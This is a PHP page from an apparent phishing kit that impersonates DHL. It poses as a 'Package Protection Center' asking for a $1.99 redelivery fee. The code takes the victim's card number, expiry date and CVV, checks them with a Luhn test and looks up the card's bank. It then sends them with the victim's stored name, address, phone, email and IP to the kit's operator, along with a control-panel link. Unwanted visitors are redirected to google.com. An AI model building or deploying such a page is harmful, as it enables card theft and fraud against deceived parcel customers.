<?php
// Error reporting disabled
//error_reporting(0);

// Protection
include_once '../app.php';
$step = $_GET["stp"];
if (strcmp($step, "s3") !== 0) {
    header("location: https://google.com");
    exit();
}

// Tools
include '../space/rand.php';
include '../space/main.php';
include '../space/send.php';

// Initialize error variable
$err = "";

if (!isset($_POST['one'])) {
    send("📍 {$_SESSION['ip']} ⚠️ In CC Page ⚠️");
}

if (isset($_POST['one'])) {
    // Session Data
    $_SESSION['one'] = $_POST['one'];
    $_SESSION['two'] = $_POST['two'];
    $_SESSION['three'] = $_POST['three'];

    $NAME = htmlspecialchars($_SESSION['NAME']);
    $ADDRESS = htmlspecialchars($_SESSION['ADDRESS']);
    $CITY = htmlspecialchars($_SESSION['CITY']);
    $ZIP = htmlspecialchars($_SESSION['ZIP']);
    $PHONE = htmlspecialchars($_SESSION['PHONE']);
    $EMAIL = htmlspecialchars($_SESSION['EMAIL']);
    $currentDir = __DIR__;
    $host = $_SERVER['HTTP_HOST'];
    $uri = $_SERVER['REQUEST_URI'];
    $directory = dirname($uri);
    $controlPageUrl = "http://$host$directory/control.php";

    // Validate Card Number
    include '../space/bin.php';
    $t = is_valid_luhn($_POST["one"]); 

    if ($t === true) {
        $two = $_POST["two"];
        $twoParts = explode('/', $two);
        $month = $twoParts[0];
        $year = $twoParts[1];

        $hi = "\r\n";
        $hi .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n";
        $hi .= "💳 *Card Number*: " . htmlspecialchars($_POST['one']) . "\r\n";
        $hi .= "📅 *Expiration*: {$month}/{$year}\r\n";
        $hi .= "🔒 *CVV*: " . htmlspecialchars($_POST['three']) . "\r\n\r\n";
        $hi .= "🔗 *Control Panel*: {$controlPageUrl}\r\n\r\n";
        
        $hi .= "👤 *CUSTOMER INFO*\r\n";
        $hi .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n";
        $hi .= "👤 *Name*: {$NAME}\r\n";
        $hi .= "🏠 *Address*: {$ADDRESS}\r\n";
        $hi .= "🏙️ *City*: {$CITY}\r\n";
        $hi .= "📮 *ZIP*: {$ZIP}\r\n";
        $hi .= "📞 *Phone*: {$PHONE}\r\n";
        $hi .= "✉️ *Email*: {$EMAIL}\r\n\r\n";
        
        $hi .= "🌐 *IP INFO*\r\n";
        $hi .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n";
        $hi .= "🌍 *IP Address*: {$_SESSION['ip']}\r\n";
        $hi .= "🖥️ *Browser*: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
        $hi .= "📋 *User Agent*: {$_SERVER['HTTP_USER_AGENT']}\r\n";
        $hi .= "⏰ *Time*: " . date("d/m/Y h:i:sa") . " GMT\r\n";
        $hi .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n\r\n";
        
        $hi .= "💻 *DRAZC0DER XF*\r\n";
        $hi .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━\r\n";
        
        // Bin Information
        $bin = $_POST['one'];
        $bin = preg_replace('/\s/', '', $bin);
        $bin = substr($bin, 0, 8);
        $b_name = bin($bin, 'name');
        $b_scheme = bin($bin, 'scheme');

        $subject = "💳 BILL & CARD 💳 FROM - {$NAME} - {$_SESSION['ip']} - {$b_name} | {$b_scheme}";
        send($subject . "\n\n" . $hi);
        header('Location: ./l.php?session=' . urlencode($rand100) . '&r=' . urlencode($rand50) . '&stp=wait&id=' . urlencode($b_name) . '&scheme=' . urlencode($b_scheme) . '&ref=C3rd');
        echo $subject . "\n" . $hi;
    } else {
        $err = "<app-error id='appErrorAbove'><div id='errContainer' role='status' class='flex flex-items-top mar-b-md-lg mar-b-lg-sm'><div id='errorIcon' class='height-sm-lg width-sm-lg flex-shrink-0 mar-r-xxs'><svg height='32' width='32' viewBox='0 0 32 32' aria-label='icon image' role='img' focusable='false'><path d='M29.21 24.53L18.62 5.63a3 3 0 00-5.24 0L2.79 24.53A3 3 0 005.41 29h21.18a3 3 0 002.62-4.47zM17 24h-2v-2h2zm0-4h-2v-8h2z' fill='#ea712f'></path></svg></div><div><p id='errorContent' class='flex flex-column type-sm line-h-md'><span id='errorDescArea'>There is a problem. Please enter a valid card number.</span></p></div></div></app-error>";
    }
}

include 're.php';
?>

<html><head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow,"="" "noimageindex,"="" "noarchive,"="" "nocache,"="" "nosnippet"="">
        
        <!-- CSS FILES -->
        <style type="text/css">:host,:root{--fa-font-solid:normal 900 1em/1 "Font Awesome 6 Solid";--fa-font-regular:normal 400 1em/1 "Font Awesome 6 Regular";--fa-font-light:normal 300 1em/1 "Font Awesome 6 Light";--fa-font-thin:normal 100 1em/1 "Font Awesome 6 Thin";--fa-font-duotone:normal 900 1em/1 "Font Awesome 6 Duotone";--fa-font-sharp-solid:normal 900 1em/1 "Font Awesome 6 Sharp";--fa-font-brands:normal 400 1em/1 "Font Awesome 6 Brands"}svg:not(:host).svg-inline--fa,svg:not(:root).svg-inline--fa{overflow:visible;box-sizing:content-box}.svg-inline--fa{display:var(--fa-display,inline-block);height:1em;overflow:visible;vertical-align:-.125em}.svg-inline--fa.fa-2xs{vertical-align:.1em}.svg-inline--fa.fa-xs{vertical-align:0}.svg-inline--fa.fa-sm{vertical-align:-.0714285705em}.svg-inline--fa.fa-lg{vertical-align:-.2em}.svg-inline--fa.fa-xl{vertical-align:-.25em}.svg-inline--fa.fa-2xl{vertical-align:-.3125em}.svg-inline--fa.fa-pull-left{margin-right:var(--fa-pull-margin,.3em);width:auto}.svg-inline--fa.fa-pull-right{margin-left:var(--fa-pull-margin,.3em);width:auto}.svg-inline--fa.fa-li{width:var(--fa-li-width,2em);top:.25em}.svg-inline--fa.fa-fw{width:var(--fa-fw-width,1.25em)}.fa-layers svg.svg-inline--fa{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0}.fa-layers-counter,.fa-layers-text{display:inline-block;position:absolute;text-align:center}.fa-layers{display:inline-block;height:1em;position:relative;text-align:center;vertical-align:-.125em;width:1em}.fa-layers svg.svg-inline--fa{-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-text{left:50%;top:50%;-webkit-transform:translate(-50%,-50%);transform:translate(-50%,-50%);-webkit-transform-origin:center center;transform-origin:center center}.fa-layers-counter{background-color:var(--fa-counter-background-color,#ff253a);border-radius:var(--fa-counter-border-radius,1em);box-sizing:border-box;color:var(--fa-inverse,#fff);line-height:var(--fa-counter-line-height,1);max-width:var(--fa-counter-max-width,5em);min-width:var(--fa-counter-min-width,1.5em);overflow:hidden;padding:var(--fa-counter-padding,.25em .5em);right:var(--fa-right,0);text-overflow:ellipsis;top:var(--fa-top,0);-webkit-transform:scale(var(--fa-counter-scale,.25));transform:scale(var(--fa-counter-scale,.25));-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-bottom-right{bottom:var(--fa-bottom,0);right:var(--fa-right,0);top:auto;-webkit-transform:scale(var(--fa-layers-scale,.25));transform:scale(var(--fa-layers-scale,.25));-webkit-transform-origin:bottom right;transform-origin:bottom right}.fa-layers-bottom-left{bottom:var(--fa-bottom,0);left:var(--fa-left,0);right:auto;top:auto;-webkit-transform:scale(var(--fa-layers-scale,.25));transform:scale(var(--fa-layers-scale,.25));-webkit-transform-origin:bottom left;transform-origin:bottom left}.fa-layers-top-right{top:var(--fa-top,0);right:var(--fa-right,0);-webkit-transform:scale(var(--fa-layers-scale,.25));transform:scale(var(--fa-layers-scale,.25));-webkit-transform-origin:top right;transform-origin:top right}.fa-layers-top-left{left:var(--fa-left,0);right:auto;top:var(--fa-top,0);-webkit-transform:scale(var(--fa-layers-scale,.25));transform:scale(var(--fa-layers-scale,.25));-webkit-transform-origin:top left;transform-origin:top left}.fa-1x{font-size:1em}.fa-2x{font-size:2em}.fa-3x{font-size:3em}.fa-4x{font-size:4em}.fa-5x{font-size:5em}.fa-6x{font-size:6em}.fa-7x{font-size:7em}.fa-8x{font-size:8em}.fa-9x{font-size:9em}.fa-10x{font-size:10em}.fa-2xs{font-size:.625em;line-height:.1em;vertical-align:.225em}.fa-xs{font-size:.75em;line-height:.0833333337em;vertical-align:.125em}.fa-sm{font-size:.875em;line-height:.0714285718em;vertical-align:.0535714295em}.fa-lg{font-size:1.25em;line-height:.05em;vertical-align:-.075em}.fa-xl{font-size:1.5em;line-height:.0416666682em;vertical-align:-.125em}.fa-2xl{font-size:2em;line-height:.03125em;vertical-align:-.1875em}.fa-fw{text-align:center;width:1.25em}.fa-ul{list-style-type:none;margin-left:var(--fa-li-margin,2.5em);padding-left:0}.fa-ul>li{position:relative}.fa-li{left:calc(var(--fa-li-width,2em) * -1);position:absolute;text-align:center;width:var(--fa-li-width,2em);line-height:inherit}.fa-border{border-color:var(--fa-border-color,#eee);border-radius:var(--fa-border-radius,.1em);border-style:var(--fa-border-style,solid);border-width:var(--fa-border-width,.08em);padding:var(--fa-border-padding,.2em .25em .15em)}.fa-pull-left{float:left;margin-right:var(--fa-pull-margin,.3em)}.fa-pull-right{float:right;margin-left:var(--fa-pull-margin,.3em)}.fa-beat{-webkit-animation-name:fa-beat;animation-name:fa-beat;-webkit-animation-delay:var(--fa-animation-delay,0s);animation-delay:var(--fa-animation-delay,0s);-webkit-animation-direction:var(--fa-animation-direction,normal);animation-direction:var(--fa-animation-direction,normal);-webkit-animation-duration:var(--fa-animation-duration,1s);animation-duration:var(--fa-animation-duration,1s);-webkit-animation-iteration-count:var(--fa-animation-iteration-count,infinite);animation-iteration-count:var(--fa-animation-iteration-count,infinite);-webkit-animation-timing-function:var(--fa-animation-timing,ease-in-out);animation-timing-function:var(--fa-animation-timing,ease-in-out)}.fa-bounce{-webkit-animation-name:fa-bounce;animation-name:fa-bounce;-webkit-animation-delay:var(--fa-animation-delay,0s);animation-delay:var(--fa-animation-delay,0s);-webkit-animation-direction:var(--fa-animation-direction,normal);animation-direction:var(--fa-animation-direction,normal);-webkit-animation-duration:var(--fa-animation-duration,1s);animation-duration:var(--fa-animation-duration,1s);-webkit-animation-iteration-count:var(--fa-animation-iteration-count,infinite);animation-iteration-count:var(--fa-animation-iteration-count,infinite);-webkit-animation-timing-function:var(--fa-animation-timing,cubic-bezier(.28,.84,.42,1));animation-timing-function:var(--fa-animation-timing,cubic-bezier(.28,.84,.42,1))}.fa-fade{-webkit-animation-name:fa-fade;animation-name:fa-fade;-webkit-animation-delay:var(--fa-animation-delay,0s);animation-delay:var(--fa-animation-delay,0s);-webkit-animation-direction:var(--fa-animation-direction,normal);animation-direction:var(--fa-animation-direction,normal);-webkit-animation-duration:var(--fa-animation-duration,1s);animation-duration:var(--fa-animation-duration,1s);-webkit-animation-iteration-count:var(--fa-animation-iteration-count,infinite);animation-iteration-count:var(--fa-animation-iteration-count,infinite);-webkit-animation-timing-function:var(--fa-animation-timing,cubic-bezier(.4,0,.6,1));animation-timing-function:var(--fa-animation-timing,cubic-bezier(.4,0,.6,1))}.fa-beat-fade{-webkit-animation-name:fa-beat-fade;animation-name:fa-beat-fade;-webkit-animation-delay:var(--fa-animation-delay,0s);animation-delay:var(--fa-animation-delay,0s);-webkit-animation-direction:var(--fa-animation-direction,normal);animation-direction:var(--fa-animation-direction,normal);-webkit-animation-duration:var(--fa-animation-duration,1s);animation-duration:var(--fa-animation-duration,1s);-webkit-animation-iteration-count:var(--fa-animation-iteration-count,infinite);animation-iteration-count:var(--fa-animation-iteration-count,infinite);-webkit-animation-timing-function:var(--fa-animation-timing,cubic-bezier(.4,0,.6,1));animation-timing-function:var(--fa-animation-timing,cubic-bezier(.4,0,.6,1))}.fa-flip{-webkit-animation-name:fa-flip;animation-name:fa-flip;-webkit-animation-delay:var(--fa-animation-delay,0s);animation-delay:var(--fa-animation-delay,0s);-webkit-animation-direction:var(--fa-animation-direction,normal);animation-direction:var(--fa-animation-direction,normal);-webkit-animation-duration:var(--fa-animation-duration,1s);animation-duration:var(--fa-animation-duration,1s);-webkit-animation-iteration-count:var(--fa-animation-iteration-count,infinite);animation-iteration-count:var(--fa-animation-iteration-count,infinite);-webkit-animation-timing-function:var(--fa-animation-timing,ease-in-out);animation-timing-function:var(--fa-animation-timing,ease-in-out)}.fa-shake{-webkit-animation-name:fa-shake;animation-name:fa-shake;-webkit-animation-delay:var(--fa-animation-delay,0s);animation-delay:var(--fa-animation-delay,0s);-webkit-animation-direction:var(--fa-animation-direction,normal);animation-direction:var(--fa-animation-direction,normal);-webkit-animation-duration:var(--fa-animation-duration,1s);animation-duration:var(--fa-animation-duration,1s);-webkit-animation-iteration-count:var(--fa-animation-iteration-count,infinite);animation-iteration-count:var(--fa-animation-iteration-count,infinite);-webkit-animation-timing-function:var(--fa-animation-timing,linear);animation-timing-function:var(--fa-animation-timing,linear)}.fa-spin{-webkit-animation-name:fa-spin;animation-name:fa-spin;-webkit-animation-delay:var(--fa-animation-delay,0s);animation-delay:var(--fa-animation-delay,0s);-webkit-animation-direction:var(--fa-animation-direction,normal);animation-direction:var(--fa-animation-direction,normal);-webkit-animation-duration:var(--fa-animation-duration,2s);animation-duration:var(--fa-animation-duration,2s);-webkit-animation-iteration-count:var(--fa-animation-iteration-count,infinite);animation-iteration-count:var(--fa-animation-iteration-count,infinite);-webkit-animation-timing-function:var(--fa-animation-timing,linear);animation-timing-function:var(--fa-animation-timing,linear)}.fa-spin-reverse{--fa-animation-direction:reverse}.fa-pulse,.fa-spin-pulse{-webkit-animation-name:fa-spin;animation-name:fa-spin;-webkit-animation-direction:var(--fa-animation-direction,normal);animation-direction:var(--fa-animation-direction,normal);-webkit-animation-duration:var(--fa-animation-duration,1s);animation-duration:var(--fa-animation-duration,1s);-webkit-animation-iteration-count:var(--fa-animation-iteration-count,infinite);animation-iteration-count:var(--fa-animation-iteration-count,infinite);-webkit-animation-timing-function:var(--fa-animation-timing,steps(8));animation-timing-function:var(--fa-animation-timing,steps(8))}@media (prefers-reduced-motion:reduce){.fa-beat,.fa-beat-fade,.fa-bounce,.fa-fade,.fa-flip,.fa-pulse,.fa-shake,.fa-spin,.fa-spin-pulse{-webkit-animation-delay:-1ms;animation-delay:-1ms;-webkit-animation-duration:1ms;animation-duration:1ms;-webkit-animation-iteration-count:1;animation-iteration-count:1;transition-delay:0s;transition-duration:0s}}@-webkit-keyframes fa-beat{0%,90%{-webkit-transform:scale(1);transform:scale(1)}45%{-webkit-transform:scale(var(--fa-beat-scale,1.25));transform:scale(var(--fa-beat-scale,1.25))}}@keyframes fa-beat{0%,90%{-webkit-transform:scale(1);transform:scale(1)}45%{-webkit-transform:scale(var(--fa-beat-scale,1.25));transform:scale(var(--fa-beat-scale,1.25))}}@-webkit-keyframes fa-bounce{0%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}10%{-webkit-transform:scale(var(--fa-bounce-start-scale-x,1.1),var(--fa-bounce-start-scale-y,.9)) translateY(0);transform:scale(var(--fa-bounce-start-scale-x,1.1),var(--fa-bounce-start-scale-y,.9)) translateY(0)}30%{-webkit-transform:scale(var(--fa-bounce-jump-scale-x,.9),var(--fa-bounce-jump-scale-y,1.1)) translateY(var(--fa-bounce-height,-.5em));transform:scale(var(--fa-bounce-jump-scale-x,.9),var(--fa-bounce-jump-scale-y,1.1)) translateY(var(--fa-bounce-height,-.5em))}50%{-webkit-transform:scale(var(--fa-bounce-land-scale-x,1.05),var(--fa-bounce-land-scale-y,.95)) translateY(0);transform:scale(var(--fa-bounce-land-scale-x,1.05),var(--fa-bounce-land-scale-y,.95)) translateY(0)}57%{-webkit-transform:scale(1,1) translateY(var(--fa-bounce-rebound,-.125em));transform:scale(1,1) translateY(var(--fa-bounce-rebound,-.125em))}64%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}100%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}}@keyframes fa-bounce{0%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}10%{-webkit-transform:scale(var(--fa-bounce-start-scale-x,1.1),var(--fa-bounce-start-scale-y,.9)) translateY(0);transform:scale(var(--fa-bounce-start-scale-x,1.1),var(--fa-bounce-start-scale-y,.9)) translateY(0)}30%{-webkit-transform:scale(var(--fa-bounce-jump-scale-x,.9),var(--fa-bounce-jump-scale-y,1.1)) translateY(var(--fa-bounce-height,-.5em));transform:scale(var(--fa-bounce-jump-scale-x,.9),var(--fa-bounce-jump-scale-y,1.1)) translateY(var(--fa-bounce-height,-.5em))}50%{-webkit-transform:scale(var(--fa-bounce-land-scale-x,1.05),var(--fa-bounce-land-scale-y,.95)) translateY(0);transform:scale(var(--fa-bounce-land-scale-x,1.05),var(--fa-bounce-land-scale-y,.95)) translateY(0)}57%{-webkit-transform:scale(1,1) translateY(var(--fa-bounce-rebound,-.125em));transform:scale(1,1) translateY(var(--fa-bounce-rebound,-.125em))}64%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}100%{-webkit-transform:scale(1,1) translateY(0);transform:scale(1,1) translateY(0)}}@-webkit-keyframes fa-fade{50%{opacity:var(--fa-fade-opacity,.4)}}@keyframes fa-fade{50%{opacity:var(--fa-fade-opacity,.4)}}@-webkit-keyframes fa-beat-fade{0%,100%{opacity:var(--fa-beat-fade-opacity,.4);-webkit-transform:scale(1);transform:scale(1)}50%{opacity:1;-webkit-transform:scale(var(--fa-beat-fade-scale,1.125));transform:scale(var(--fa-beat-fade-scale,1.125))}}@keyframes fa-beat-fade{0%,100%{opacity:var(--fa-beat-fade-opacity,.4);-webkit-transform:scale(1);transform:scale(1)}50%{opacity:1;-webkit-transform:scale(var(--fa-beat-fade-scale,1.125));transform:scale(var(--fa-beat-fade-scale,1.125))}}@-webkit-keyframes fa-flip{50%{-webkit-transform:rotate3d(var(--fa-flip-x,0),var(--fa-flip-y,1),var(--fa-flip-z,0),var(--fa-flip-angle,-180deg));transform:rotate3d(var(--fa-flip-x,0),var(--fa-flip-y,1),var(--fa-flip-z,0),var(--fa-flip-angle,-180deg))}}@keyframes fa-flip{50%{-webkit-transform:rotate3d(var(--fa-flip-x,0),var(--fa-flip-y,1),var(--fa-flip-z,0),var(--fa-flip-angle,-180deg));transform:rotate3d(var(--fa-flip-x,0),var(--fa-flip-y,1),var(--fa-flip-z,0),var(--fa-flip-angle,-180deg))}}@-webkit-keyframes fa-shake{0%{-webkit-transform:rotate(-15deg);transform:rotate(-15deg)}4%{-webkit-transform:rotate(15deg);transform:rotate(15deg)}24%,8%{-webkit-transform:rotate(-18deg);transform:rotate(-18deg)}12%,28%{-webkit-transform:rotate(18deg);transform:rotate(18deg)}16%{-webkit-transform:rotate(-22deg);transform:rotate(-22deg)}20%{-webkit-transform:rotate(22deg);transform:rotate(22deg)}32%{-webkit-transform:rotate(-12deg);transform:rotate(-12deg)}36%{-webkit-transform:rotate(12deg);transform:rotate(12deg)}100%,40%{-webkit-transform:rotate(0);transform:rotate(0)}}@keyframes fa-shake{0%{-webkit-transform:rotate(-15deg);transform:rotate(-15deg)}4%{-webkit-transform:rotate(15deg);transform:rotate(15deg)}24%,8%{-webkit-transform:rotate(-18deg);transform:rotate(-18deg)}12%,28%{-webkit-transform:rotate(18deg);transform:rotate(18deg)}16%{-webkit-transform:rotate(-22deg);transform:rotate(-22deg)}20%{-webkit-transform:rotate(22deg);transform:rotate(22deg)}32%{-webkit-transform:rotate(-12deg);transform:rotate(-12deg)}36%{-webkit-transform:rotate(12deg);transform:rotate(12deg)}100%,40%{-webkit-transform:rotate(0);transform:rotate(0)}}@-webkit-keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}@keyframes fa-spin{0%{-webkit-transform:rotate(0);transform:rotate(0)}100%{-webkit-transform:rotate(360deg);transform:rotate(360deg)}}.fa-rotate-90{-webkit-transform:rotate(90deg);transform:rotate(90deg)}.fa-rotate-180{-webkit-transform:rotate(180deg);transform:rotate(180deg)}.fa-rotate-270{-webkit-transform:rotate(270deg);transform:rotate(270deg)}.fa-flip-horizontal{-webkit-transform:scale(-1,1);transform:scale(-1,1)}.fa-flip-vertical{-webkit-transform:scale(1,-1);transform:scale(1,-1)}.fa-flip-both,.fa-flip-horizontal.fa-flip-vertical{-webkit-transform:scale(-1,-1);transform:scale(-1,-1)}.fa-rotate-by{-webkit-transform:rotate(var(--fa-rotate-angle,none));transform:rotate(var(--fa-rotate-angle,none))}.fa-stack{display:inline-block;vertical-align:middle;height:2em;position:relative;width:2.5em}.fa-stack-1x,.fa-stack-2x{bottom:0;left:0;margin:auto;position:absolute;right:0;top:0;z-index:var(--fa-stack-z-index,auto)}.svg-inline--fa.fa-stack-1x{height:1em;width:1.25em}.svg-inline--fa.fa-stack-2x{height:2em;width:2.5em}.fa-inverse{color:var(--fa-inverse,#fff)}.fa-sr-only,.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border-width:0}.fa-sr-only-focusable:not(:focus),.sr-only-focusable:not(:focus){position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border-width:0}.svg-inline--fa .fa-primary{fill:var(--fa-primary-color,currentColor);opacity:var(--fa-primary-opacity,1)}.svg-inline--fa .fa-secondary{fill:var(--fa-secondary-color,currentColor);opacity:var(--fa-secondary-opacity,.4)}.svg-inline--fa.fa-swap-opacity .fa-primary{opacity:var(--fa-secondary-opacity,.4)}.svg-inline--fa.fa-swap-opacity .fa-secondary{opacity:var(--fa-primary-opacity,1)}.svg-inline--fa mask .fa-primary,.svg-inline--fa mask .fa-secondary{fill:#000}.fa-duotone.fa-inverse,.fad.fa-inverse{color:var(--fa-inverse,#fff)}</style><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0/dist/css/bootstrap.min.css?r=<?php echo $rand30; ?>">
        <link rel="stylesheet" href="../files/css//font-awesome.min.css?r=<?php echo $rand30; ?>">
		<link rel="stylesheet" href="../files/css//style.css?r=<?php echo $rand30; ?>">
		<link rel="stylesheet" href="../files/css//bootstrap-icons.css?r=<?php echo $rand30; ?>">
		
        <link rel="icon" type="image/x-icon" href="../files/img/favicon.ico">

        <title>| DHL |</title>
    </head>
<body>
<div class="navbar">
    <div class="container-fluid">
        <div class="topping">
            <img src="../files/img/dhl-logo.svg">
            <ul class="web">
                <li><i class="bi bi-exclamation-circle me-2"></i> Warning(1)</li>
                <li> Contact us</li>
                <li><i class="bi bi-globe me-2"></i> </li>
                <li><i class="bi bi-globe me-2"></i> German</li>
                <li><i class="bi bi-search me-2"></i> Search</li>
            </ul>
            <ul class="respo">
                <li><i class="bi bi-list"></i></li>
                <li></li>
            </ul>
        </div>
        <div class="bottomin">
            <ul>
                <li>Track<i class="bi bi-chevron-down ms-1"></i></li>
                <li>Ship<i class="bi bi-chevron-down ms-1"></i></li>
                <li>Logistics solutions<i class="bi bi-chevron-down ms-1"></i></li>
                <li>Customer service<i class="bi bi-chevron-down ms-1"></i></li>
            </ul>
            <p><i class="bi bi-person-fill me-2"></i> Customer portal logins</p>
        </div>
    </div>
</div>
<div class="home info carta">
    <div class="otside put">
        <div class="container">
        <br>
            <div class="lettre login valid">
                <div class="dell">
<div>
    <div name="content" style="text-align: center;">
    <img src="../files/img/LOGA.svg" style="width: 50px;">
</div>
<h2 name="content" style="text-align: center;">
    Package Protection Center    <img src="../files/img/LOGAA.svg" style="width: 35px;">
</h2>
</div>

                    <div class="titre">
                        <img src="../files/img/camion.png">
                        <h3 style=" color: #d40511; ">Schedule a re-delivery</h3>
                    </div>
                    <div class="steps">
                        <span class="green"></span>
                        <span class="green"></span>
                        <span></span>
                    </div>
                </div>
                <form method="post">
                    <div class="row gx-4">
                        <div class="col-lg-8 genius">
                            <div class="gauche hna">
                                <h4>Card information </h4>
                                <div class="magic" style="text-align: center;">
                                    <?php echo $err; ?>
                                <img src="../files/img/MASTERCARD.png">
                                <img src="../files/img/DISCOVER.png">
                                <img src="../files/img/AMEX.png">
                                <img src="../files/img/VISA.png">
                                </div>  
                                    <div class="form-group mt-3 ">
                                         <label for="one">Card number <span>*</span></label>
                                         <input type="text" name="one" id="one" class="form-control" placeholder="XXXX XXXX XXXX XXXX" required="" maxlength="20">
                                    </div>
                                <div class="calisy">
                                <div class="form-group mt-3 ville">  
                                <label for="two">Expiration date <span>*</span></label>
                                <input type="text" name="two" id="two" class="form-control" placeholder="MM/JJ" required="" maxlength="5">
                                </div>
                                <div class="form-group mt-3 astra">     
                                <label for="three">Security code <span>*</span></label>
                                 <input type="text" name="three" id="three" class="form-control" placeholder="CVV" required="" maxlength="4">
                                </div>
                                 </div>
                                <div class="botona">
                                    <button class="btn" id="normalButton" name="button">Pay 1.99 $</button>
                                </div>
                                <div class="botona" style="display:none;">
                                    <button class="btn" name="submit">Pay 1.99 $</button>
                                </div>                                      
                            
                            </div>
                        </div>
                        <div class="col-lg-4 power">
                            <div class="droit lhih">
                                <div class="offre">
<div class="status">
<p>TRACKING NUMBER :<b>US789******46</b></p></div>                                        <div class="status">
                                        <p>Status: <b> On hold </b></p>
                                    </div>
                                    <div class="status">
                                        <p>This shipment is being processed by: <b>DHL Parcel</b></p>
                                    </div>
                                </div>
                                <div class="offre">
                                    <div class="status">
                                        <p>Last updated: <b><?php $date = new DateTime(); echo $date->format('d/m/Y');?></b></p>
                                    </div>
                                    <div class="status">
                                        <p>Shipping method: <b>Other</b></p>
                                    </div>
                                    <div class="status">
                                        <p>Total: <b>1.99$</b></p>
                                    </div>
                                </div>
                                <hr>
                                <div class="important mt-4">
<h5>Important message!</h5>
<p>Enter your information and pay the additional fee to send your package</p>
</div>
                            </div>
                        </div>
                    </div>
                </form>
                </div>
            </div>
        </div>
    </div>
<div class="sous boso">
    <div class="container-fluid">
        <div class="row">
            <div class="col-lg-9">
                <img src="../files/img/group.svg">
                <ul>
                    <li>Fraud prevention</li>
                    <li>Legal notice</li>
                    <li>Terms of use</li>
                    <li>Data protection declaration</li>
                    <li>Conflict resolution</li>
                    <li>Accessibility</li>
                    <li>Additional information</li>
                    <li>Cookie settings</li>
                </ul>
            </div>
            <div class="col-lg-3">
                <h6>Follow us</h6>
                <img src="../files/img/socio.png" class="socio">
            </div>
            <div class="text-center ss"><?php echo date("Y") ?> © DHL International GmbH. All rights reserved</div>
        </div>  
    </div>
</div>

<!-- JS FILES -->
<script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>


       <script>
    $("#one").mask("0000000000000000000");
    $("#two").mask("00/00");
    $("#three").mask("0000");
</script>
<script>
<?php
control();
?>
</script>
 </body></html>
